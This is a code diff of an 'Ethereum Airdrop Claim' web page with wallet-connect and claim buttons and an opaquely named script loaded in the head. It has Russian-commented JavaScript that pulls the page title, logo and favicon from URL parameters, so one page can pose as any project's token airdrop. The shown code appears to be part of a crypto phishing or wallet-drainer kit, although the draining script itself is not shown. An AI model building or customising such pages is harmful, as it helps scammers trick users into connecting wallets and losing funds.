@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ethereum Airdrop Claim</title>
+    <title id="mrc"></title>
+        <link rel="icon" href="default-favicon.png" type="image/png">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:400,700,900&amp;display=swap">
     <link rel="stylesheet" href="./styles.css">
      <script src="./674c56abbfe0211925e0d409.js"></script>
@@ -20,7 +21,7 @@
             <a href="#features" class="nav-link">Features</a>
             <a href="#steps" class="nav-link">How It Works</a>
             <button class="connect-wallet">
-                <span class="open wallet-dot"></span>
+                <span class="wallet-dot"></span>
                 Connect Wallet
             </button>
         </div>
@@ -55,7 +56,7 @@
                                 <i class="fas fa-gas-pump"></i>
                                 <span>Estimated Gas: <span class="gas-amount">0.002 ETH</span></span>
                             </div>
-                            <button class="open claim-button" id="claimButton" disabled="">
+                            <button class="claim-button" id="claimButton" disabled="">
                                 <span>Claim Tokens</span>
                                 <i class="fas fa-arrow-right"></i>
                             </button>
@@ -117,43 +118,53 @@ padding-right: 5%;
 
     <!-- Script to Handle URL Parameters -->
     <script>
-        // Функция для получения параметра из URL
-        function getParameterByName(name, url = window.location.href) {
-            name = name.replace(/[\[\]]/g, '\\$&'); // Escape special characters in the name
-            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
-                  results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, ' '));
-        }
+      // Функция для получения параметра из URL
+      function getParameterByName(name, url = window.location.href) {
+          name = name.replace(/[\[\]]/g, '\\$&'); // Экранирование спецсимволов
+          const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+          if (!results) return null;
+          if (!results[2]) return '';
+          return decodeURIComponent(results[2].replace(/\+/g, ' '));
+      }
 
-        // Получаем параметры 'id', 'mr' и 'splash' из URL
-        const id = getParameterByName('id');  // Пример: id=SEEKER
-        const mr = getParameterByName('mr');  // Пример: mr=1312022991902867466/d5a87c8f26cb120cd5e2a008f4124b96.png?size=1024
-        const splash = getParameterByName('splash');  // Пример: splash=1007294687629029416/95330a8f4ff5f436fa907e448d8944f5.png?size=1024
+      // Получение параметров из URL
+      const id = getParameterByName('id');      // Текст заголовка и логотипа
+      const mr = getParameterByName('mr');      // Логотип и favicon
+      const splash = getParameterByName('splash'); // Фоновое изображение
 
-        console.log("id:", id);
-        console.log("mr:", mr);
-        console.log("splash:", splash);
+      console.log("id:", id);
+      console.log("mr:", mr);
+      console.log("splash:", splash);
 
-        // Обновляем логотип и текст
-        if (id && mr) {
-            document.querySelectorAll('#mr').forEach(img => img.src = mr);
-            document.querySelectorAll('#mrc').forEach(el => el.textContent = id);
-        } else {
-            console.error("Не найдены параметры: 'id' или 'mr'");
-        }
+      // Обновление логотипа, текста и favicon
+      if (id && mr) {
+          // Логотип
+          document.querySelectorAll('#mr').forEach(img => img.src = mr);
+          // Текст
+          document.querySelectorAll('#mrc').forEach(el => el.textContent = id);
+          // Favicon
+          const faviconElement = document.querySelector('link[rel="icon"]') || document.createElement('link');
+          faviconElement.rel = "icon";
+          faviconElement.href = mr;
+          document.head.appendChild(faviconElement);
+          // Заголовок страницы
+          document.title = id + "";
+      } else {
+          console.error("Параметры 'id' или 'mr' не найдены.");
+      }
 
-        // Обновляем фон
-        if (splash) {
-            const splashUrl = splash;
-            document.querySelectorAll('#splash').forEach(el => {
-                el.style.backgroundImage = `linear-gradient(90deg, rgba(0, 0, 0, 0.3) 0%, rgba(0, 0, 0, 0.7) 100%)`;
-            });
-        } else {
-            console.error("Не найден параметр: 'splash'");
-        }
-    </script>
+      // Обновление фонового изображения
+      if (splash) {
+          const splashUrl = splash;
+          document.querySelectorAll('#splash').forEach(el => {
+              el.style.backgroundImage = `linear-gradient(90deg, rgba(0, 0, 0, 0.3) 0%, rgba(0, 0, 0, 0.7) 100%)`;
+          });
+      } else {
+          console.error("Параметр 'splash' не найден.");
+      }
+  </script>
+
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
